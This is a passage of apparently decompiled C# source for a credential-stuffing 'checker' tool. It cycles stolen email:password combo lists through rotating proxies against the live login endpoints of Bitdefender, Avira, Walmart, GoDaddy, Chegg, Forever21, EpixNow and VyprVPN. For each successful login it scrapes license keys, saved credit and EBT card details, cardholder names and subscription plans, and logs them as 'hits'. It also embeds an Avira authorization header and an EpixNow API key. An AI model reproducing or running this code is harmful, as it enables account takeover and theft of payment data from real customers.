				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = "";
				int num = text.IndexOf("@");
				text3 = ((num <= 0) ? text : text.Substring(0, num));
				string text4 = text3 + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text5 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text5.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.UserAgent = "Mozilla / 5.0(Windows NT 6.3; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 75.0.3770.142 Safari / 537.36";
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AllowAutoRedirect = true;
				httpRequest.AddHeader("referer", "https://my.bitdefender.com/login");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text6 = httpRequest.Get("https://my.bitdefender.com/lv2/account?login=" + text + "&pass=" + text2 + "&action=login&type=userpass&fp=web").ToString();
				if (text6.Contains("\"token\""))
				{
					string text7 = Parse(text6, "token\": \"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
					string source = httpRequest.Get("https://my.bitdefender.com/lv2/get_info?login=" + text + "&token=" + text7 + "&fields=serials%2Caccount").ToString();
					string text8 = Parse(source, "\"product_name\": \"", "\"");
					string text9 = Parse(source, "\"key\": \"", "\"");
					string text10 = Parse(source, "max_computers\": ", ",");
					string text11 = Parse(source, "expire_time\": ", ",");
					Colorful.Console.WriteLine("[GOOD] " + text4 + " | Product: " + text8 + " | License: " + text9 + " | Max Computers: " + text10 + " | Expires: " + text11, Color.Green);
					Combos.Results(text4 + " | Product: " + text8 + " | License: " + text9 + " | Max Computers: " + text10 + " | Expires: " + text11, "Hits", "Bitdefender");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text6.Contains("wrong_login"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text4, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text4);
					Variables.Retries++;
				}
			}
		}

		public static void startAvaria()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				httpRequest.AddHeader("Authorization", "Basic YXZpcmEvZGFzaGJvYXJkOjAyMjI4OWNjOTZhMTQwOTI4YWQ5ODNjNTJmYTRjYTNlMDZmODBkZDg5NjgwNGE0YmIxNDFkMDc2MjY2YTQ0OTA=");
				httpRequest.AddHeader("Origin", "https://my.avira.com");
				httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36";
				string str = "{\"grant_type\":\"password\",\"username\":\"" + text + "\",\"password\":\"" + text2 + "\"}";
				string text5 = httpRequest.Post("https://api.my.avira.com/v2/oauth/", str, "application/json").ToString();
				if (text5.Contains("device_token"))
				{
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					Colorful.Console.WriteLine("[GOOD] " + text3, Color.Green);
					Combos.Results(text3, "Hits", "Avaria");
				}
				else if (text5.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("invalid_credentials"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startWalmart()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0";
				httpRequest.AddHeader("Origin", "https://www.walmart.com");
				httpRequest.AddHeader("Referer", "https://www.walmart.com/account/login?tid=0&vid=2&returnUrl=%2F%3Fpp%3D1");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Cache-Control", "no-cache");
				string str = "{\"username\":\"" + text + "\",\"password\":\"" + text2 + "\",\"rememberme\":true,\"showRememberme\":\"true\",\"captcha\":{\"sensorData\":\"\"}}";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://www.walmart.com/account/electrode/api/signin?tid=0&vid=2&returnUrl=%2F%3Fpp%3D1", str, "application/json").ToString();
				if (text5.Contains("firstName"))
				{
					string str2 = Parse(text5, "\"firstName\":\"", "\"");
					string str3 = Parse(text5, "\"lastName\":\"", "\"");
					string text6 = str2 + " " + str3;
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0";
					httpRequest.AddHeader("Host", "www.walmart.com");
					httpRequest.AddHeader("Referer", "https://www.walmart.com/account/creditcards");
					string source = httpRequest.Get("https://www.walmart.com/account/electrode/account/api/customer/:CID/payment-method").ToString();
					string text7 = Parse(source, "\"giftCards\":\"", "\"");
					string text8 = Parse(source, "\"creditCards\":\"", "\"");
					string text9 = Parse(source, "\"ebtCards\":\"", "\"");
					string text10 = Parse(source, "\"wallets\":\"", "\"");
					Colorful.Console.WriteLine("[HIT] " + text3 + " | " + text6 + " | Gift Cards: " + text7 + " | CCs: " + text8 + " | EBT Cards: " + text9 + " | Wallets: " + text10, Color.Green);
					Combos.Results(text3 + " | " + text6 + " | Gift Cards: " + text7 + " | CCs: " + text8 + " | EBT Cards: " + text9 + " | Wallets: " + text10, "Hits", "Walmart");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("Your password and email do not match. Please try again or Reset Your Password.") || text5.Contains("user_auth_fail"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startGodaddy()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/user/checkusername", "{\"checkusername\":\"" + text + "\"}", "application/json").ToString();
				if (text5.Contains("username is unavailable") || text5.Contains("message\": \"Ok"))
				{
					string text6 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account", "{\"username\":\"" + text + "\",\"password\":\"" + text2 + "\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\",\"captcha_code\":\"\",\"captcha_type\":\"recaptcha_v2_invisible\"}", "application/json").ToString();
					if (text6.Contains("Username and password did not match"))
					{
						if (ShowFails)
						{
							Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
						}
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
					}
					else if (text6.Contains("User account is timer locked"))
					{
						Variables.ComboList.Add(text3);
						Variables.Retries++;
					}
					else if (text6.Contains("message\": \"Ok\""))
					{
						System.Console.ForegroundColor = ConsoleColor.Green;
						System.Console.WriteLine("[GOOD] " + text3);
						Checker.Increment_CPM++;
						Variables.Hits++;
						Variables.Progress++;
						Combos.Results(text3, "Hits", "GoDaddy");
					}
				}
				else if (text5.Contains("username is invalid"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("username is available"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startChegg()
		{
			Random random = new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				if (text2.Length < 7)
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
					continue;
				}
				Array array2 = new string[4]
				{
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
					"Mozilla / 5.0(Windows NT 6.3; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 75.0.3770.142 Safari / 537.36",
					"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
				};
				httpRequest.AddHeader("origin", "https://chaas.chegg.com");
				httpRequest.AddHeader("referer", "https://chaas.chegg.com/");
				httpRequest.AddHeader("sec-fetch-dest", "document");
				httpRequest.AddHeader("sec-fetch-mode", "navigate");
				httpRequest.AddHeader("sec-fetch-site", "same-origin");
				httpRequest.AddHeader("sec-fetch-user", "?1");
				httpRequest.AddHeader("upgrade-insecure-requests", "1");
				int num = random.Next(array2.Length);
				httpRequest.UserAgent = (string)((object[])array2)[num];
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AllowAutoRedirect = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Get("https://chaas.chegg.com/login").ToString();
				string text6 = Parse(text5, "csrf_token\" value=\"", "\"><input ");
				string str = "login=" + text + "&password=" + text2 + "&csrf_token=" + text6 + "&submit=Sign+In";
				string text7 = httpRequest.Post("https://chaas.chegg.com/login", str, "application/x-www-form-urlencoded").ToString();
				if (text7.Contains("                It seems like that you do not have permission to access this site. If you think this is a mistake, please logout and try logging in again."))
				{
					Colorful.Console.WriteLine("[GOOD] " + text3, Color.Green);
					Combos.Results(text3, "Hits", "Chegg");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("You must provide valid credentials"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startForever21()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string source = httpRequest.Get("https://www.forever21.com/us/shop/account/signin").ToString();
				string value = Parse(source, "window.NREUM||(NREUM={})).loader_config={xpid:\"", "\"");
				httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
				httpRequest.AddHeader("X-NewRelic-ID", value);
				httpRequest.AddHeader("Origin", "https://www.forever21.com");
				httpRequest.AddHeader("Referer", "https://www.forever21.com/us/shop/account/signin");
				string text5 = httpRequest.Post("https://www.forever21.com/us/shop/Account/DoSignIn", "userid=&id=" + text + "&password=" + text2 + "&isGuest=", "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("\"ErrorMessage\":\"\""))
				{
					string str = Parse(text5, "\"UserId\":\"", "\"");
					string text6 = httpRequest.Post("https://www.forever21.com/us/shop/Account/GetCreditCardList", "userid=" + str, "application/x-www-form-urlencoded").ToString();
					if (text6.Contains("Credit Card Information cannot be found."))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Forever 21");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						continue;
					}
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					string text7 = Parse(text6, "\"CardHolder\":\"", "\"");
					string text8 = Parse(text6, "\"CardType\":\"", "\"");
					string text9 = Parse(text6, "\"DisplayName\":\"" + text8 + "<br>", "\"");
					string text10 = Parse(text6, "\"ExpirationMonth\":\"", "\"");
					string text11 = Parse(text6, "\"ExpirationYear\":\"", "\"");
					Colorful.Console.WriteLine("[GOOD] " + text3 + " Card Holder = " + text7 + " Card Number = " + text9 + " Card Type = " + text8 + " Expiry = " + text10 + "/" + text11, Color.Green);
					Combos.Results(text3 + " | Card Holder = " + text7 + " | Card Number = " + text9 + " | Card Type = " + text8 + " |    Expiry = " + text10 + "/" + text11, "Hits", "Forever 21");
				}
				else if (text5.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("User cannot be found"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("Your email or password is incorrect. Please try again."))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startWish()
		{
		}

		public static void startEpixNow()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string source = httpRequest.Post("https://api.epixnow.com/v2/sessions", "{\"device\":{\"guid\":\"b3425835-7d63-47b1-8a5a-6c2fa4e6d4f8\",\"format\":\"console\",\"os\":\"web\",\"display_width\":1180,\"display_height\":969,\"app_version\":\"1.0.2\",\"model\":\"browser\",\"manufacturer\":\"google\"},\"apikey\":\"53e208a9bbaee479903f43b39d7301f7\"}", "application/json").ToString();
				string value = Parse(source, "\"session_token\":\"", "\",");
				httpRequest.AddHeader("origin", "https://www.epixnow.com");
				httpRequest.AddHeader("referer", "https://www.epixnow.com/login/");
				httpRequest.AddHeader("accept", "application/json");
				httpRequest.AddHeader("X-Session-Token", value);
				string text5 = httpRequest.Post("https://api.epixnow.com/v2/epix_user_session", "{\"user\":{\"email\":\"" + text + "\",\"password\":\"" + text2 + "\"}}", "application/json").ToString();
				if (text5.Contains("user_session"))
				{
					if (text5.Contains("It looks like you're missing out! Subscribe and get unlimited access to exclusive shows, 1000s of movies and more."))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "EpixNow");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					}
					else
					{
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						Colorful.Console.WriteLine("[GOOD] " + text3, Color.Green);
						Combos.Results(text3, "Hits", "EpixNow");
					}
				}
				else if (text5.Contains("log in to your account at this time. Please try again later"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Your email and password do not match."))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startVypr()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.AllowAutoRedirect = false;
				httpRequest.Cookies = new CookieDictionary();
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.UserAgent = "okhttp/2.3.0";
				httpRequest.AddHeader("username", text);
				httpRequest.AddHeader("password", text2);
				httpRequest.AddHeader("X-GF-Agent", "VyprVPN Android v2.19.0.7702. (56aa5dfd)");
				httpRequest.AddHeader("X-GF-PRODUCT", "VyprVPN");
				httpRequest.AddHeader("X-GF-PRODUCT-VERSION", "2.19.0.7702");
				httpRequest.AddHeader("X-GF-PLATFORM", "Android");
				httpRequest.AddHeader("X-GF-PLATFORM-VERSION", "6.0");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Get("https://api.goldenfrog.com/settings").ToString();
				if (text5.Contains("confirmed\": true"))
				{
					string text6 = Parse(text5, "\"account_level_display\": \"", "\"");
					Combos.Results(text3 + " | Plan: " + text6, "Hits", "VyprVPN");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					Colorful.Console.WriteLine("[GOOD] " + text3 + " | Plan: " + text6);
				}
				else if (text5.Contains("invalid username or password"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Progress++;
				}
				else if (text5.Contains("vpn\": null"))
				{
					Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					Combos.Results(text3, "Free", "VyprVPN");
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (!text5.Contains("locked"))
				{
					Colorful.Console.WriteLine("[LOCKED] " + text3, Color.Yellow);
					Combos.Results(text3, "Locked", "VyprVPN");
					Checker.Increment_CPM++;
					Variables.Progress++;
				}
				else if (!text5.Contains("Your browser didn't send a complete request in time"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startIpVanish()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.AddHeader("Pragma", "no-cache");
